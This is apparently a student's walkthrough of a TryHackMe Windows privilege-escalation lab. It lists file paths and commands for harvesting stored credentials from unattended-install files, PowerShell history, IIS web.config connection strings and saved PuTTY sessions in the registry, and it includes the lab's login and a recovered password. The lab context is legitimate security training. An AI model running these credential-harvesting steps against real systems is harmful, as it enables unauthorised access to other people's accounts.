# Windows Privilege Escalation
###URL : https://tryhackme.com/room/windowsprivesc20

First we start the VM and connect to the Windows machine with :
`xfreerdp /u:thm-unpriv /p:Password321 /v:10.10.13.22`

(You can add /f to start in fullscreen mode. Why it uses slashes to annotate arguments, "OpenSource" i guess).

## Harvesting password from the Usual Spots

First we look for Unattended-Installation configurations on the "usual" places. 
We checkout this list of Usual suspects, but fail to find anything that is accessible:

```

    C:\Unattend.xml
    C:\Windows\Panther\Unattend.xml
    C:\Windows\Panther\Unattend\Unattend.xml
    C:\Windows\system32\sysprep.inf
    C:\Windows\system32\sysprep\sysprep.xml

```

Then we checkout the Powershell history and find a password hidden in plain sight.

```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
C:\Windows\System32\Sysprep>type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt                                                                                                                            ls                                                                                                                           whoami                                                                                                                       whoami /priv                                                                                                                 whoami /group                                                                                                                whoami /groups                                                                                                               cmdkey /?                                                                                                                    cmdkey /add:thmdc.local /user:julia.jones /pass:ZuperCkretPa5z                                                               cmdkey /list                                                                                                                 cmdkey /delete:thmdc.local                                                                                                   cmdkey /list                                                                                                                 runas /?                                                                     
```

So here we see some account creation commands beeing run, interesting.
`with "cmdkey /list"` we can see the currently saved credentials

Lets move on to the questions, see what they got:

### A password for the julia.jones user has been left on the Powershell history. What is the password?

We can find the answer to this in previously grabbed output from the history.

### A web server is running on the remote host. Find any interesting password on web.config files associated with IIS. What is the password of the db_admin user?

Turns out i was following the instructions but was looking in the /Framework/ Folder, not in the /Framework64/ folder. Eventually i found the correct password by using Powershell:

`Get-Content .\web.config |Select-String -Pattern connectionString -Context 1,1`

### Retrieve the saved password stored in the saved PuTTY session under your profile. What is the password for the thom.smith user?

reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s